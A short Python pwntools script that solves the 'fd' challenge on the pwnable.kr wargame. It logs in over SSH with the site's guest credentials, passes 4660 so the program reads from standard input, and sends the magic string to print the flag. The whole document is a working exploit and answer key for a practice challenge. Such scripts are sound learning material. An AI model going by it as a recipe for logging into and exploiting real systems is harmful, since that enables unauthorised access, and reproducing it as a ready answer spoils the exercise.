from pwn import *
 
shell = ssh("fd", "pwnable.kr", port=2222, password="guest")

sh = shell.run('/bin/sh')
sh.sendline("./fd 4660")
sh.sendline("LETMEWIN")
print(sh.recvlines(timeout=3))
shell.close()